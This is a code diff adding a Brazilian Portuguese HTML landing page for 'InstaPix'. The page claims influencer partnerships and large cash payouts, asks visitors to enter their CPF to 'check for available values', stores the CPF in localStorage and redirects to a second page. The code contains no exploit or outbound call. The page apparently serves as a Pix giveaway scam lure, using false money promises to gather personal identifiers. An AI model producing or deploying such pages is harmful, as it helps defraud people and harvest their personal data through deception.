@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premia Pix</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script>
+        // Limpa o localStorage ao carregar a página
+        window.onload = function() {
+            localStorage.clear(); // Remove todos os itens do localStorage
+        };
+    </script>
+</head>
+<body>
+    <main>
+        <div class="container">
+            <div class="areas">
+                <img src="images/insta-pix-logo.webp" alt="" style="height: 44px; width: 250px;margin-bottom: 5vh;">
+            </div>
+            <div class="areas" style="display: flex; justify-content: center;align-items: center;flex-direction: column;">
+                <div style="box-shadow: 2px 11px 36px -8px rgba(0,0,0,0.47);
+                -webkit-box-shadow: 2px 11px 36px -8px rgba(0,0,0,0.47);
+                -moz-box-shadow: 2px 11px 36px -8px rgba(0,0,0,0.47);background-color: #BDEEEA;border-radius: 10px;display: flex; justify-content: center;align-items: center;text-align: center;width: 80%; padding: 20px;font-size: 14px;">
+                    <b>Em parceria com grandes influenciadores o InstaPix é o app que mais distribui dinheiro no momento!</b>
+                </div>
+                <div style="background-color: #FFFFFF;border-radius: 10px;display: flex; justify-content: center;align-items: center;text-align: center;width: 83%; padding: 10px;font-size: 14px;margin-top: 5vh;">
+                    <p>Consulte se existe valores disponíveis no seu CPF</p>
+                </div>
+                <div style="display: flex; justify-content: center;align-items: center;text-align: center;width: 86%;margin-top: 2vh;">
+                    <input type="text" id="inputCpf" placeholder="Digite seu CPF" 
+                           style="border-radius: 10px;padding: 5px; width: 100%;height: 44px;" 
+                           maxlength="14" oninput="mascaraCPF(this)" 
+                           onkeypress="return apenasNumeros(event)" inputmode="numeric" required>
+                </div>
+                <div style="display: flex; justify-content: center;align-items: center;text-align: center;width: 86%;margin-top: 2vh;">
+                    <button onclick="salvarCpf()" style="background-color: #005952;display: flex; justify-content: center;align-items: center;text-align: center;width: 100%;color: #FFFFFF;border-radius: 10px;padding: 5px;height: 50px;cursor: pointer;">
+                        Consultar & Continuar
+                    </button>
+                </div>
+                <div id="error-message" style="color: red; display: none; margin-top: 10px;"></div> <!-- Mensagem de erro -->
+                <div style="color: gray;margin-top: 5vh;">
+                    2024 © Insta PIX
+                </div>
+            </div>
+        </div>
+    </main>
+    <script>
+        function salvarCpf() {
+            const inputCpf = document.getElementById("inputCpf").value.trim(); // Remove espaços em branco
+
+            // Verifica se o campo está vazio
+            if (inputCpf === "") {
+                const errorMessage = document.getElementById("error-message");
+                errorMessage.textContent = "O CPF não pode ser vazio!";
+                errorMessage.style.display = "block"; // Exibe a mensagem de erro
+                return; // Sai da função
+            } else {
+                const errorMessage = document.getElementById("error-message");
+                errorMessage.style.display = "none"; // Oculta a mensagem de erro se houver um CPF válido
+            }
+
+            // Armazenar o valor do CPF no localStorage
+            localStorage.setItem("cpf", inputCpf);
+            // Redirecionar para a próxima página (opcional)
+            window.location.href = "secondPage.html"; 
+        }
+
+        function mascaraCPF(input) {
+            let value = input.value.replace(/\D/g, ""); // Remove tudo que não é dígito
+            value = value.replace(/^(\d{3})(\d)/, "$1.$2"); // Adiciona ponto após os 3 primeiros dígitos
+            value = value.replace(/^(\d{3})\.(\d{3})(\d)/, "$1.$2.$3"); // Adiciona ponto após os 6 dígitos
+            value = value.replace(/\.(\d{3})(\d{1,2})$/, ".$1-$2"); // Adiciona traço entre o terceiro grupo de dígitos e os dois últimos
+            input.value = value;
+        }
+
+        function apenasNumeros(event) {
+            const charCode = event.which ? event.which : event.keyCode;
+            // Permitir apenas números (48 a 57 são os códigos ASCII para os números de 0 a 9)
+            if (charCode < 48 || charCode > 57) {
+                event.preventDefault();
+                return false;
+            }
+            return true;
+        }
+    </script>
+</body>
+</html>
